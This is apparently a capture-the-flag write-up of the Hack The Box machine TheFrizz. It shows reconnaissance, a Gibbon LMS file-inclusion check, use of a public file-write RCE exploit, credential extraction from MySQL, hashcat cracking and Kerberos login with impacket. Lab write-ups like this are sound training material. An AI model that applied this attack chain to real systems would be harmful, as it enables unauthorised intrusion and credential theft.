---
hidden: true
icon: windows
---

# TheFrizz - Medium

<figure><img src="../../.gitbook/assets/image (215).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/thefrizz"><strong>TheFrizz</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.60 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 14:42 EDT
Nmap scan report for 10.10.11.60
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 01:46:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54017/tcp open  msrpc         Microsoft Windows RPC
54021/tcp open  msrpc         Microsoft Windows RPC
54031/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-10T01:47:28
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   32.68 ms 10.10.16.1
2   61.01 ms 10.10.11.60
```

We got a redirect on port 80 for http://frizzdc.frizz.htb/home/ revealing the domain and subdomain name. I will add them to my /etc/hosts file

```
10.10.11.60 frizz.htb frizzdc.frizz.htb
```



### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Clicking on Staff Login we get redirected to the Gibbon-LMS endpoint revealing the version running&#x20;

<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

Searching for exploits I came across an LFI

<figure><img src="../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Gibbon 25.0.0 LFI</mark>

Here is a [**link**](https://github.com/maddsec/CVE-2023-34598) to the Github repo

I am going to visit the following url recommended in the repo to test and see if it is vulnerable: [**`http://frizzdc.frizz.htb/Gibbon-LMS/?q=gibbon.sql`**](http://frizzdc.frizz.htb/Gibbon-LMS/?q=gibbon.sql)

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

```
http://frizzdc.frizz.htb/Gibbon-LMS/?q=./vendor/composer/installed.json
```

<figure><img src="../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

This LFI is not doing much for us. Searching for a couple of more exploits I came across an RCE [**here**](https://github.com/ulricvbs/gibbonlms-filewrite_rce) abusing the Arbitrary File Write in GIbbon LMV v 25.0.1

### <mark style="color:$primary;">Gibbon 25.0.1 RCE</mark>

```
git clone https://github.com/ulricvbs/gibbonlms-filewrite_rce.git
```

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

Now to get a better reverse shell | [https://www.revshells.com/](https://www.revshells.com/)

<figure><img src="../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

I found a config file in `C:\xampp\htdocs\Gibbon-LMS` holding some creds

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating MySQL DB</mark>

There is a mysql executable located in xampp I will make use of it to iterate over the database

{% code overflow="wrap" %}
```powershell
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

Use the below command to enumerate over the tables:\


{% code overflow="wrap" %}
```powershell
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW TABLES;" gibbon
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

The one table that stood out was gibbonperson, let's see what is inside

{% code overflow="wrap" %}
```powershell
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

We got a user from here, Let's check the [**Gibbon's repo**](https://github.com/GibbonEdu/core/blob/v30.0.00/passwordResetProcess.php) for how they use the salt with the password

<figure><img src="../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

I’ll grab the `username`, `passwordStrong`, and `passwordStrongSalt` fields and create a file to decrypt using this format: \<hash>:\<salt>

{% code overflow="wrap" %}
```
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2490
```
{% endcode %}

I am going to use hashcat for this

### <mark style="color:$primary;">Cracking Sha256($salt.$pass)</mark>

<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

hashcat tells us the hash type we need in this case 1420

```bash
hashcat f.frizzle.hash /usr/share/wordlists/rockyou.txt -m 1420
```

<figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

```
f.frizzle:Jenni_Luvs_Magic23
```

<figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

NTLM authentication is disabled we have to switch to Kerberos, let's sync our time with DC first

```bash
service virtualbox-guest-utils stop
sudo ntpdate frizzdc.frizz.htb
```

<figure><img src="../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

Now for Kerberos Authentication

<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

Since we are not able to login via normal ssh, we will use **TGT (Ticket Granting Ticket)** for a user from the **Kerberos Key Distribution Center (KDC).**

```bash
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=f.frizzle.ccache
netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
ssh f.frizzle@frizz.htb -K
```

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

If you run into this problem it is your host file. I had to change it to this

```
10.10.11.60 frizzdc.frizz.htb frizz.htb
```

<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumeration as f.frizzle</mark>

<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

I’m using `-force` to show hidden files and directories, The root of the filesystem has an unusual file that f.frizzle can’t access

#### <mark style="color:$primary;">Recycle Bin</mark>

```
cd '$RECYCLE.BIN'
```

In f.frizzle's recycle bin there is a hidden directory&#x20;

<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

Inside there are two types of files. The ones that start with `$I` store metadata about the file. The `$R` file holds the original content.

#### <mark style="color:$primary;">**Recover File**</mark>
